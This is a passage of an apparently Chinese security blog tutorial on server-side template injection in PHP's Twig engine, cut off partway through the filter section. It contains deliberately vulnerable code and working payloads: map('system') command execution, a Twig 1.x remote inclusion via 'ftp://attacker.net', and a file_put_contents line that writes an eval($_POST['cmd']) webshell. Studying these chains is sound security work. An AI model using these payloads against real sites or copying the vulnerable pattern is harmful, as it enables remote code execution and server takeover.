class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 引入 Twig 自动加载器</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;lib/Twig/Autoloader.php&#x27;</span>;</span><br><span class="line"><span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修正点 1：使用正确的文件系统加载器类</span></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">Twig_Loader_Filesystem</span>(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/templates&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修正点 2：使用完整类名实例化环境</span></span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="variable">$loader</span>, [</span><br><span class="line">    <span class="string">&#x27;auto_reload&#x27;</span> =&gt; <span class="literal">true</span> <span class="comment">// 开发模式建议开启</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 渲染模板（确保 templates/page.html.twig 文件存在）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;page.html.twig&#x27;</span>);</span><br></pre></td></tr></table></figure><p>​访问后渲染结果如下</p><p><img src="/img/PHP-ssti-Twig/image-20250227113019832.png" alt="image-20250227113019832"></p><p>​</p><h3 id="Twig-1-x"><a href="#Twig-1-x" class="headerlink" title="Twig 1.x"></a>Twig 1.x</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>​从<a href="https://github.com/twigphp/Twig/tree/v1.16.1%E4%B8%AD%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E5%90%8E%E8%A7%A3%E5%8E%8B%E5%88%B0PHPstudy%E7%9A%84WWW%E7%9B%AE%E5%BD%95%E7%9A%84%E5%90%8C%E4%B8%80%E7%BA%A7%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E5%B9%B6%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E8%AE%A9%E4%BB%96%E8%A7%A3%E6%9E%90%EF%BC%8C%E5%85%B7%E4%BD%93%E8%AE%BE%E7%BD%AE%E5%A6%82%E4%B8%8B%EF%BC%9A">https://github.com/twigphp/Twig/tree/v1.16.1中下载源码后解压到PHPstudy的WWW目录的同一级目录下，并创建一个网站让他解析，具体设置如下：</a></p><p><img src="/img/PHP-ssti-Twig/image-20250226200703760.png" alt="image-20250226200703760"></p><h4 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h4><p>​在网站根目录下创建一个index.php文件，并键入如下内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 引入 Twig 自动加载器</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;lib/Twig/Autoloader.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册 Twig 自动加载器</span></span><br><span class="line"><span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建基于内存的模板加载器（加载一个名为 &#x27;index&#x27; 的模板）</span></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">Twig_Loader_Array</span>(<span class="keyword">array</span>( </span><br><span class="line">    <span class="string">&#x27;index&#x27;</span> =&gt; <span class="string">&#x27;Hello &#123;&#123; name &#125;&#125;!&#x27;</span>, <span class="comment">// 模板内容，使用 Twig 模板语法</span></span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 Twig 环境实例</span></span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 渲染 &#x27;index&#x27; 模板并传递变量</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;World&#x27;</span>)); <span class="comment">// 输出 &quot;Hello World!&quot;</span></span><br></pre></td></tr></table></figure><p>​随后访问<a href="http://twig1.localhost/test.php%EF%BC%8C%E4%BD%A0%E5%B0%86%E7%9C%8B%E5%88%B0**Hello">http://twig1.localhost/test.php，你将看到**Hello</a> World!**</p><p>​Twig 模板注入也是发生在直接将用户输入作为模板，比如下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 引入 Twig 自动加载器</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;lib/Twig/Autoloader.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册 Twig 自动加载器</span></span><br><span class="line"><span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建字符串模板加载器（允许直接渲染字符串模板）</span></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">Twig_Loader_String</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化 Twig 环境</span></span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接渲染来自 GET 参数 &#x27;name&#x27; 的模板内容</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]); <span class="comment">// 动态执行用户输入的 Twig 模板代码</span></span><br></pre></td></tr></table></figure><h4 id="利用链解析"><a href="#利用链解析" class="headerlink" title="利用链解析"></a>利用链解析</h4><p>​在 Twig 1.x 中存在三个全局变量：</p><blockquote><ul><li><code>_self</code>：引用当前模板的实例。</li><li><code>_context</code>：引用当前上下文。</li><li><code>_charset</code>：引用当前字符集。</li></ul></blockquote><p>​对应的代码在<code>Twig-1.16.1\lib\Twig\Node\Expression\Name.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="variable">$specialVars</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;_self&#x27;</span>    =&gt; <span class="string">&#x27;$this&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;_context&#x27;</span> =&gt; <span class="string">&#x27;$context&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;_charset&#x27;</span> =&gt; <span class="string">&#x27;$this-&gt;env-&gt;getCharset()&#x27;</span>,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>​当模板代码中使用 <code>_self</code> 变量时，它会返回当前的 <code>\Twig\Template</code> 实例。这个实例对象包含了一个指向 <code>Twig_Environment</code> 的 <code>env</code> 属性，我们可以通过它继续调用 <code>Twig_Environment</code> 中的其他方法。因此，通过在模板代码中使用 <code>_self</code> 变量和 <code>env</code> 属性，攻击者可以构造任意代码执行的攻击载荷，从而进行 SSTI 攻击。</p><p>​例如该Payload 可以调用 <code>setCache</code> 方法改变 Twig 加载 PHP 文件的路径，在 <code>allow_url_include</code> 开启的情况下我们可以通过改变路径实现远程文件包含：</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.setCache(<span class="string">&quot;ftp://attacker.net:21&quot;</span>)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.loadTemplate(<span class="string">&quot;backdoor&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>​我们在Twig-1.16.1\lib\Twig\Environment.php文件中还有 <code>getFilter</code> 方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;filterCallbacks <span class="keyword">as</span> <span class="variable">$callback</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> !== <span class="variable">$filter</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$callback</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$filter</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​而在该方法中我们发现了危险函数<code>call_usr_func</code>通过传递参数到该函数中，我们可以调用任意 PHP 函数。因此有如下利用方法：</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(<span class="string">&quot;calc&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Twig-2-x-3-x"><a href="#Twig-2-x-3-x" class="headerlink" title="Twig 2.x &#x2F; 3.x"></a>Twig 2.x &#x2F; 3.x</h3><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><p>​从<a href="https://github.com/twigphp/Twig/tree/v2.14.9%E4%B8%AD%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E5%90%8E%E8%A7%A3%E5%8E%8B%E5%88%B0PHPstudy%E7%9A%84WWW%E7%9B%AE%E5%BD%95%E7%9A%84%E5%90%8C%E4%B8%80%E7%BA%A7%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E5%B9%B6%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E8%AE%A9%E4%BB%96%E8%A7%A3%E6%9E%90%EF%BC%8C%E5%85%B7%E4%BD%93%E8%AE%BE%E7%BD%AE%E5%A6%82%E4%B8%8B%EF%BC%9A">https://github.com/twigphp/Twig/tree/v2.14.9中下载源码后解压到PHPstudy的WWW目录的同一级目录下，并创建一个网站让他解析，具体设置如下：</a></p><p><img src="/img/PHP-ssti-Twig/image-20250303160849594.png" alt="image-20250303160849594"></p><h4 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a>代码示例</h4><p>​在index.php中键入如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Loader\ArrayLoader</span>();</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$template</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">createTemplate</span>(<span class="string">&quot;Hello <span class="subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span>!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$template</span>-&gt;<span class="title function_ invoke__">render</span>();</span><br></pre></td></tr></table></figure><p>​访问如下链接：<a href="http://twig2.localhost/?name=world%E4%BD%A0%E5%B0%86%E7%9C%8B%E5%88%B0%60Hello">http://twig2.localhost/?name=world你将看到`Hello</a> world!&#96;</p><p>​上述示例是一个存在模板注入漏洞的示例，到了 Twig 2.x &#x2F; 3.x 版本中，<code>__self</code> 变量在 SSTI 中早已失去了他的作用，但我们可以借助新版本中的一些过滤器实现目的。</p><h5 id="map过滤器"><a href="#map过滤器" class="headerlink" title="map过滤器"></a>map过滤器</h5><p>​在 Twig 中，<code>map</code> 这个过滤器可以允许用户传递一个箭头函数，并将这个箭头函数应用于序列或映射的元素，示例模板文件如下：</p><h6 id="map-html-twig"><a href="#map-html-twig" class="headerlink" title="map.html.twig"></a><code>map.html.twig</code></h6><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">set</span> people = [</span><br><span class="line">    &#123;first: <span class="string">&quot;Bob&quot;</span>, last: <span class="string">&quot;Smith&quot;</span>&#125;,</span><br><span class="line">    &#123;first: <span class="string">&quot;Alice&quot;</span>, last: <span class="string">&quot;Dupond&quot;</span>&#125;,</span><br><span class="line">] <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; people<span class="punctuation">|</span><span class="keyword">map</span>(p =&gt; <span class="string">&quot;#&#123;p.first&#125; #&#123;p.last&#125;&quot;</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&#x27;, &#x27;</span>) &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">set</span> people = &#123;</span><br><span class="line">    <span class="string">&quot;Bob&quot;</span>: <span class="string">&quot;Smith&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Alice&quot;</span>: <span class="string">&quot;Dupond&quot;</span>,</span><br><span class="line">&#125; <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; people<span class="punctuation">|</span><span class="keyword">map</span>((last, first) =&gt; <span class="string">&quot;#&#123;first&#125; #&#123;last&#125;&quot;</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&#x27;, &#x27;</span>) &#125;&#125;</span></span><br></pre></td></tr></table></figure><p>​使用如下PHP文件调用并渲染该模板：</p><h6 id="map-php"><a href="#map-php" class="headerlink" title="map.php"></a><code>map.php</code></h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Loader\FilesystemLoader</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/templates&#x27;</span>);</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 渲染模板</span></span><br><span class="line"><span class="variable">$template</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">load</span>(<span class="string">&#x27;map.html.twig&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$template</span>-&gt;<span class="title function_ invoke__">render</span>();</span><br></pre></td></tr></table></figure><h6 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">your_project/</span><br><span class="line">├── templates/</span><br><span class="line">│   └── map.html.twig</span><br><span class="line">└── map.php</span><br></pre></td></tr></table></figure><p>​访问后你将得到输出：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bob Smith, Alice Dupond</span><br><span class="line">Bob Smith, Alice Dupond</span><br></pre></td></tr></table></figure><h6 id="利用解析"><a href="#利用解析" class="headerlink" title="利用解析"></a>利用解析</h6><p>​当我们如下使用 <code>map</code> 时：</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;[<span class="string">&quot;Mark&quot;</span>]<span class="punctuation">|</span><span class="keyword">map</span>((arg)=&gt;<span class="string">&quot;Hello #&#123;arg&#125;!&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>​Twig 会将其编译成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">twig_array_map</span>([<span class="number">0</span> =&gt; <span class="string">&quot;Mark&quot;</span>], function (<span class="variable">$__arg__</span>) <span class="keyword">use</span> ($<span class="title">context</span>, $<span class="title">macros</span>) &#123; </span><br><span class="line">    $<span class="title">context</span>[&quot;<span class="title">arg</span>&quot;] = $<span class="title">__arg__</span>; <span class="keyword">return</span> (<span class="string">&quot;hello &quot;</span> . (<span class="variable">$context</span>[<span class="string">&quot;arg&quot;</span>] ?? <span class="literal">null</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>​这个 <code>twig_array_map</code> 函数的源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twig_array_map</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$arrow</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">        <span class="variable">$r</span>[<span class="variable">$k</span>] = <span class="variable">$arrow</span>(<span class="variable">$v</span>, <span class="variable">$k</span>);    <span class="comment">// 直接将 $arrow 当做函数执行</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​关键部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$r</span>[<span class="variable">$k</span>] = <span class="variable">$arrow</span>(<span class="variable">$v</span>, <span class="variable">$k</span>);    </span><br></pre></td></tr></table></figure><p>​从上面的代码我们可以看到，传入的 <code>$arrow</code> 直接就被当成函数执行，即 <code>$arrow($v, $k)</code>，而 <code>$v</code> 和 <code>$k</code> 分别是 <code>$array</code> 中的 value 和 key。<code>$array</code> 和 <code>$arrow</code> 都是我们我们可控的，那我们可以不传箭头函数，直接传一个可传入两个参数的、能够命令执行的危险函数名即可实现命令执行。通过查阅常见的命令执行函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span> ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ] ) : <span class="keyword">string</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span> ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ] )</span><br><span class="line"><span class="title function_ invoke__">exec</span> ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">array</span> &amp;<span class="variable">$output</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ]] ) : <span class="keyword">string</span></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span> ( <span class="keyword">string</span> <span class="variable">$cmd</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>​前三个都可以使用。相应的 Payload 如下：</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;[<span class="string">&quot;calc&quot;</span>]<span class="punctuation">|</span><span class="keyword">map</span>(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;[<span class="string">&quot;calc&quot;</span>]<span class="punctuation">|</span><span class="keyword">map</span>(<span class="string">&quot;passthru&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;[<span class="string">&quot;calc&quot;</span>]<span class="punctuation">|</span><span class="keyword">map</span>(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="language-xml">    // 无回显</span></span><br></pre></td></tr></table></figure><p>​其中，<code>&#123;&#123;["calc"]|map("system")&#125;&#125;</code> 会被解析成下面这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">twig_array_map</span>([<span class="number">0</span> =&gt; <span class="string">&quot;calc&quot;</span>], <span class="string">&quot;sysetm&quot;</span>)</span><br></pre></td></tr></table></figure><p>​最终在 <code>twig_array_map</code> 函数中将执行 <code>system(&#39;calc&#39;,0)</code>。执行结果如下图所示：</p><p><img src="/img/PHP-ssti-Twig/image-20250303163507917.png" alt="image-20250303163507917"></p><p>​如果上面这些命令执行函数都被禁用了，我们还可以执行其他函数执行任意代码</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;[<span class="string">&quot;phpinfo();&quot;</span>]<span class="punctuation">|</span><span class="keyword">map</span>(<span class="string">&quot;eval&quot;</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;&#123;<span class="string">&quot;&lt;?php phpinfo();eval($_POST[&#x27;cmd&#x27;])&quot;</span>:<span class="string">&quot;web目录&quot;</span>&#125;<span class="punctuation">|</span><span class="keyword">map</span>(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;</span><span class="language-xml">    // 写 Webshell</span></span><br></pre></td></tr></table></figure><p>​按照 <code>map</code> 的利用思路，我们去找带有 <code>$arrow</code> 参数的，可以发现下面几个过滤器也是可以利用的。</p><h5 id="filer过滤器"><a href="#filer过滤器" class="headerlink" title="filer过滤器"></a>filer过滤器</h5><p>​这个 <code>filter</code> 过滤器使用箭头函数来过滤序列或映射中的元素。箭头函数用于接收序列或映射的值，示例模板如下：</p><h6 id="filter-html-twig"><a href="#filter-html-twig" class="headerlink" title="filter .html.twig"></a><code>filter .html.twig</code></h6><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">set</span> lists = [<span class="number">34</span>, <span class="number">36</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">42</span>] <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; lists<span class="punctuation">|</span><span class="keyword">filter</span>(v =&gt; v &gt; <span class="number">38</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&#x27;, &#x27;</span>) &#125;&#125;</span></span><br></pre></td></tr></table></figure><p>​使用如下PHP脚本可调用该Twig模板：</p><h6 id="filter-php"><a href="#filter-php" class="headerlink" title="filter.php"></a><code>filter.php</code></h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Loader\FilesystemLoader</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/templates&#x27;</span>);</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 渲染模板</span></span><br><span class="line"><span class="variable">$template</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">load</span>(<span class="string">&#x27;filter .html.twig&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$template</span>-&gt;<span class="title function_ invoke__">render</span>();</span><br></pre></td></tr></table></figure><p>​Twig将上述模板编译为如下结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="title function_ invoke__">array_filter</span>(<span class="variable">$context</span>[<span class="string">&quot;lists&quot;</span>], function (<span class="variable">$__value__</span>) &#123; <span class="keyword">return</span> (<span class="variable">$__value__</span> &gt; <span class="number">38</span>); &#125;)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h6 id="目录结构-1"><a href="#目录结构-1" class="headerlink" title="目录结构"></a>目录结构</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">your_project/</span><br><span class="line">├── templates/</span><br><span class="line">│   └── filter.html.twig</span><br><span class="line">└── filter.php</span><br></pre></td></tr></table></figure><p>​访问后你将得到如下输出：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">40, 42</span><br></pre></td></tr></table></figure><h6 id="利用解析-1"><a href="#利用解析-1" class="headerlink" title="利用解析"></a>利用解析</h6><p>​类似于 <code>map</code>，模板编译的过程中会进入 <code>twig_array_filter</code> 函数，这个 <code>twig_array_filter</code> 函数的源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twig_array_filter</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$arrow</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (\<span class="title function_ invoke__">is_array</span>(<span class="variable">$array</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">array_filter</span>(<span class="variable">$array</span>, <span class="variable">$arrow</span>, \ARRAY_FILTER_USE_BOTH);    <span class="comment">// $array 和 $arrow 直接被 array_filter 函数调用</span></span><br><span class="line">  